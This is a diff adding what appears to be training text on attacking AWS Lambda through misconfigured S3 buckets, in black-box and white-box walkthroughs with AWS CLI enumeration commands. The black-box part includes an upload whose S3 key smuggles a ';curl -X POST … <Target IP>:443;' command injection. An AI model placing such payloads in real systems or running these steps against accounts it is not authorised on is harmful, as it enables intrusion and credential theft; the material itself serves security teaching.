@@ -1,0 +1,61 @@
+As serverless functions can run without a managed server, they are vulnerable to different application-level attacks such as DDoS, command injection, and cross-site scripting (XSS).
+
+Attackers can abuse AWS Lambda functions to gain privileges and compromise the confidentiality of an account
+
+Black-Box Scenario
+
+In this scenario, attackers make certain assumptions regarding the specific feature as they do not have prior information about the internal working systems or the environment. 
+
+The steps to perform an attack using the black-box scenario approach are as follows. 
+
+▪ Step 1: An attacker accesses a misconfigured S3 bucket that was not implemented with any credentials. 
+The misconfigured buckets that the attacker gains access to may contain various organizational files.
+
+▪ Step 2: Now, the attacker uploads files to S3 and then rechecks their configurations. 
+
+▪ Step 3: Once the files are uploaded, the tags of the individual files can be calculated using a Lambda function.
+
+▪ Step 4: Then, the attacker exfiltrates the cloud credentials of an account and starts enumeration for higher privileges with the acquired AWS credentials
+
+Attackers can use the following AWS CLI commands to perform the attack. 
+▪ Run the following command to list the objects within the specific bucket. Here, consider the “prod-file-bucket-eu” bucket. aws s3 ls prod-file-bucket-eu
+
+▪ Run the following command to check the assigned tags along with some useful information:
+aws s3api get-object-tagging --bucket prod-file-bucket-eu --key config161.zip
+
+▪ Run the following command to create a new connection with another EC2 instance and ensure that arbitrary commands can be executed and can access the cloud environment:
+aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "testCurl" <Target IP>:443;'
+
+
+White-Box Scenario
+In this scenario, attackers hold prior information about the environment, which helps them in achieving their goals. 
+The steps to perform an attack using the white-box scenario approach are as follows. 
+
+▪ Step 1: An attacker obtains sensitive information such as user credentials through phishing or other social engineering methods.
+
+▪ Step 2: The attacker obtains information about the roles and other policies associated with that compromised cloud account. Here, the attacker strictly focuses on the specific misconfigured S3 bucket.
+
+▪ Step 3: The attacker can now list the Lambda functions and obtain additional information about any function.
+
+▪ Step 4: With the additional information and obtained user credentials, the attacker downloads the associated Lambda code for the detection and exploitation of potential vulnerabilities.
+
+▪ Step 5: The Lambda function can now be exploited by the attacker to launch further attacks.
+
+Attackers can use the following AWS CLI commands to perform the attack. 
+▪ Run the following command to check the user policies associated with an account: 
+aws iam list-attached-user-policies --user-name operator
+
+▪ Run the following command to list the Lambda functions and identify a specific role that has been employed by the function: 
+aws lambda list-functions
+
+▪ Execute the following command to obtain more information about the Lambda function such as a link or path for downloading the code: 
+aws lambda get-function --function-name corpFuncEasy
+
+
+
+
+
+
+
+
+
